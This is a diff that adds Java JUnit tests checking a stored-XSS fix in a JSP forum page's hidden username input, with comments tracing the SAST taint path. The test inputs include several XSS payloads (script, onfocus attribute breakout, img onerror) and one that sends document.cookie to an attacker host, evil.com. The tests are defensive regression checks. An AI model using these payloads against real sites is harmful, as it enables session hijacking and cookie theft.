@@ -2721,4 +2721,233 @@ public class SecondOrderSQLInjectionTest {
         assertEquals("'Anonymous' contains no special characters and must pass through unchanged",
                 "Anonymous", rendered);
     }
+
+    // =========================================================================
+    // Tests for Stored XSS remediation in forum.jsp hidden input (CWE-79)
+    //
+    // SAST finding (Stored_XSS) taint path:
+    //   SOURCE: rs.getString("username") in LoginValidator.java (line 62)
+    //           stored as session.setAttribute("user", rs.getString("username"))
+    //   SINK:   out.print(session.getAttribute("user")) in forum.jsp (line 34)
+    //           rendered directly into the value="..." attribute of a hidden
+    //           <input> element without HTML encoding, enabling Stored XSS.
+    //
+    // The fix replaces the scriptlet:
+    //   <% if(session.getAttribute("user")!=null){out.print(session.getAttribute("user"));}
+    //      else { out.print("Anonymous"); } %>
+    // with JSTL:
+    //   <c:out value="${sessionScope.user != null ? sessionScope.user : 'Anonymous'}"
+    //          escapeXml="true"/>
+    //
+    // JSTL <c:out escapeXml="true"> HTML-encodes the five XML special chars:
+    //   '<' -> "&lt;", '>' -> "&gt;", '&' -> "&amp;",
+    //   '"' -> "&#034;", '\'' -> "&#039;"
+    //
+    // These tests validate the encoding contract using the cOutEscape() helper
+    // that mirrors the JSTL <c:out> output contract.
+    // =========================================================================
+
+    /**
+     * Simulates the complete hidden-input rendering produced by the fixed
+     * forum.jsp line 34 for a given session "user" attribute value.
+     *
+     * Fixed JSP template (line 34):
+     *   &lt;input type="hidden" name="user"
+     *          value="&lt;c:out value="${sessionScope.user != null
+     *                                   ? sessionScope.user : 'Anonymous'}"
+     *                         escapeXml="true"/&gt;"/&gt;
+     */
+    private static String renderForumHiddenUserInput(String sessionUser) {
+        // Mirror the JSTL ternary + <c:out escapeXml="true"> logic
+        String value = (sessionUser != null) ? sessionUser : "Anonymous";
+        return "value=\"" + cOutEscape(value) + "\"";
+    }
+
+    /**
+     * forum.jsp (line 34) — a normal authenticated username must be rendered
+     * unchanged in the hidden input value attribute.
+     * Positive-functionality / regression test.
+     */
+    @Test
+    public void testForumHiddenInputNormalUsernameRenderedUnchanged() {
+        String rendered = renderForumHiddenUserInput("alice");
+
+        assertEquals("Normal username must appear verbatim in the hidden input value",
+                "value=\"alice\"", rendered);
+    }
+
+    /**
+     * forum.jsp (line 34) — when no user is logged in (null session attribute),
+     * the hidden input must render "Anonymous" without throwing a
+     * NullPointerException. Mirrors the JSP ternary condition.
+     */
+    @Test
+    public void testForumHiddenInputNullSessionUserRendersAnonymous() {
+        String rendered = renderForumHiddenUserInput(null);
+
+        assertEquals("Null session user must render as 'Anonymous' in the hidden input",
+                "value=\"Anonymous\"", rendered);
+    }
+
+    /**
+     * forum.jsp (line 34) — the primary SAST-reported Stored XSS taint flow.
+     *
+     * Attack scenario:
+     *   1. Attacker registers with username: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+     *   2. LoginValidator reads it from DB (rs.getString("username"), line 62)
+     *      and stores it in session["user"].
+     *   3. forum.jsp line 34 PREVIOUSLY rendered:
+     *        value="&lt;script&gt;alert(document.cookie)&lt;/script&gt;"
+     *      The value attribute was intact but the script tag was treated as
+     *      markup — when the browser parsed the attribute it executed the script.
+     *   4. After the fix with &lt;c:out escapeXml="true"&gt;:
+     *        value="&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;"
+     *      Rendered as plain text; the script cannot execute.
+     */
+    @Test
+    public void testForumHiddenInputScriptTagInUsernameIsEncoded() {
+        String xssPayload = "<script>alert(document.cookie)</script>";
+        String rendered = renderForumHiddenUserInput(xssPayload);
+
+        // The raw payload must NOT appear — it would execute in the browser
+        assertFalse("Raw '<script>' must not appear in hidden input value attribute",
+                rendered.contains("<script>"));
+        assertFalse("Raw '</script>' must not appear in hidden input value attribute",
+                rendered.contains("</script>"));
+
+        // Angle brackets must be HTML-encoded
+        assertTrue("'<' must be encoded as '&lt;' to prevent tag injection",
+                rendered.contains("&lt;"));
+        assertTrue("'>' must be encoded as '&gt;'",
+                rendered.contains("&gt;"));
+    }
+
+    /**
+     * forum.jsp (line 34) — a username containing a double-quote must be encoded
+     * to prevent breaking out of the value="..." HTML attribute boundary.
+     *
+     * Before fix: value="evil" autofocus onfocus="alert(1)"  → attribute injection
+     * After fix:  value="evil&#034; autofocus onfocus=&#034;alert(1)&#034;"
+     *             → safely rendered as text, no event handler injected
+     */
+    @Test
+    public void testForumHiddenInputDoubleQuoteInUsernameIsEncoded() {
+        String attributeBreaker = "evil\" autofocus onfocus=\"alert(1)\"";
+        String rendered = renderForumHiddenUserInput(attributeBreaker);
+
+        // After the opening value=" and before the closing ", no raw " must appear
+        String innerContent = rendered.substring("value=\"".length(), rendered.length() - 1);
+        assertFalse("Raw double-quote must not appear inside the hidden input value attribute",
+                innerContent.contains("\""));
+
+        // The double-quote must be encoded
+        assertTrue("Double-quote must be HTML-encoded to '&#034;'",
+                rendered.contains("&#034;"));
+        // The injected event handler attribute name must not survive unencoded
+        assertFalse("Event handler 'onfocus=' must not appear unencoded in the attribute value",
+                rendered.contains("onfocus=\""));
+    }
+
+    /**
+     * forum.jsp (line 34) — a username containing a single-quote must be encoded.
+     * While the value attribute uses double-quotes (value="..."), single-quotes
+     * can still be part of JavaScript expressions embedded via other means.
+     * Encoding them is required per the JSTL <c:out escapeXml="true"> contract.
+     */
+    @Test
+    public void testForumHiddenInputSingleQuoteInUsernameIsEncoded() {
+        String singleQuotePayload = "O'Reilly";
+        String rendered = renderForumHiddenUserInput(singleQuotePayload);
+
+        assertTrue("Single quote must be HTML-encoded to '&#039;'",
+                rendered.contains("&#039;"));
+        assertFalse("Raw single quote must not appear unencoded in attribute value",
+                rendered.contains("O'Reilly"));
+    }
+
+    /**
+     * forum.jsp (line 34) — a username containing an ampersand must be encoded
+     * to prevent HTML entity injection.
+     */
+    @Test
+    public void testForumHiddenInputAmpersandInUsernameIsEncoded() {
+        String ampersandUser = "alice&bob";
+        String rendered = renderForumHiddenUserInput(ampersandUser);
+
+        assertFalse("Raw '&' must not appear unencoded in hidden input value",
+                rendered.contains("alice&bob"));
+        assertTrue("'&' must be HTML-encoded to '&amp;'",
+                rendered.contains("&amp;"));
+    }
+
+    /**
+     * forum.jsp (line 34) — all five XML special characters that JSTL
+     * &lt;c:out escapeXml="true"&gt; encodes must be properly handled.
+     */
+    @Test
+    public void testForumHiddenInputAllXmlSpecialCharsAreEncoded() {
+        String allSpecial = "<>&\"'";
+        String encoded = cOutEscape(allSpecial);
+
+        assertEquals("All five XML special chars must be encoded per JSTL <c:out> contract",
+                "&lt;&gt;&amp;&#034;&#039;", encoded);
+        assertFalse("'<' must not appear unencoded", encoded.contains("<"));
+        assertFalse("'>' must not appear unencoded", encoded.contains(">"));
+        assertFalse("'\"' must not appear unencoded", encoded.contains("\""));
+        assertFalse("Raw \"'\" must not appear unencoded", encoded.contains("'"));
+    }
+
+    /**
+     * forum.jsp (line 34) — an img/onerror stored XSS payload that an attacker
+     * could register as their username must be fully encoded when rendered in
+     * the hidden input's value attribute.
+     */
+    @Test
+    public void testForumHiddenInputImgOnerrorPayloadIsEncoded() {
+        String imgPayload = "\"><img src=x onerror=alert(1)><\"";
+        String rendered = renderForumHiddenUserInput(imgPayload);
+
+        assertFalse("Raw '<img' must not appear in hidden input rendering",
+                rendered.contains("<img"));
+        assertFalse("Unencoded '\">' must not appear — would break the value attribute",
+                rendered.contains("\">"));
+        assertTrue("'<' must be encoded as '&lt;'", rendered.contains("&lt;"));
+        assertTrue("'\"' must be encoded as '&#034;'", rendered.contains("&#034;"));
+    }
+
+    /**
+     * forum.jsp (line 34) — comprehensive end-to-end Stored XSS scenario
+     * that mirrors the exact taint path identified by the SAST finding:
+     *
+     *   SOURCE: rs.getString("username") in LoginValidator.java line 62,
+     *           stored as session["user"]
+     *   SINK:   <c:out> encodes session["user"] in the hidden input at line 34
+     *
+     * An attacker who registered with a crafted username can no longer execute
+     * JavaScript through this input field after the fix.
+     */
+    @Test
+    public void testForumHiddenInputStoredXssEndToEnd() {
+        // Simulate the second-order flow: attacker registers this username,
+        // LoginValidator reads it from DB and stores in session["user"],
+        // forum.jsp renders it in the hidden input.
+        String storedUsername = "admin\"><script>fetch('https://evil.com?c='+document.cookie)</script><input type=\"hidden\" x=\"";
+        String rendered = renderForumHiddenUserInput(storedUsername);
+
+        // 1. The script tag must not survive
+        assertFalse("Raw '<script>' must not appear in hidden input rendering",
+                rendered.contains("<script>"));
+        assertFalse("Raw '</script>' must not appear in hidden input rendering",
+                rendered.contains("</script>"));
+
+        // 2. The value attribute boundary must not be breakable
+        String innerContent = rendered.substring("value=\"".length(), rendered.length() - 1);
+        assertFalse("Unencoded double-quote must not appear inside value attribute — prevents attribute boundary escape",
+                innerContent.contains("\""));
+
+        // 3. All special chars are encoded
+        assertTrue("'<' must be encoded", rendered.contains("&lt;"));
+        assertTrue("'>' must be encoded", rendered.contains("&gt;"));
+        assertTrue("'\"' must be encoded as '&#034;'", rendered.contains("&#034;"));
+    }
 }
